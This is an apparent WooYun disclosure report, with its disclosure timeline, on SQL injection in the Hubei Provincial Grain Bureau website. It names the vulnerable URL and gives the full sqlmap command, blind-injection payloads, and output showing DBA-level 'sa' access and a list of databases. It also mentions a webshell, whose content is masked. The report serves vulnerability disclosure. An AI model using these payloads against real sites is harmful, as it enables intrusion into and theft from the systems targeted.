wybug_title: 湖北省粮食局 SQL注入（已getshell）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-10-21：	细节已通知厂商并且等待厂商处理中									2014-10-25：	厂商已经确认，细节仅向厂商公开									2014-11-04：	细节向核心白帽子及相关领域专家公开									2014-11-14：	细节向普通白帽子公开									2014-11-24：	细节向实习白帽子公开									2014-12-05：	细节向公众公开  简要描述： ~~~ 详细说明：  注入点：
http://www.hblsj.gov.cn/ShowVote.aspx?VoteID=7
sqlmap:
python sqlmap.py -u "http://www.hblsj.gov.cn/ShowVote.aspx?VoteID=7" --is-dba --dbs --current-db --current-user --threads 10 sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: VoteID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: VoteID=7 AND 9678=9678    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: VoteID=-5069 OR 6576=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005current user:    'sa'current database:    'hblsj'current user is DBA:    Trueavailable databases [10]:[*] hblsj[*] jdgl[*] jdgl1[*] lsj[*] master[*] model[*] msdb[*] temp[*] tempdb[*] ycjc[23:03:14] [INFO] fetching tables for database: hblsj[23:03:14] [INFO] fetching number of tables for database 'hblsj'[23:03:14] [INFO] retrieved: 37[23:05:45] [INFO] retrieved: dbo.D99_CMD   不全列出来了
一句话木马：



mask 区域
*****^ x*****
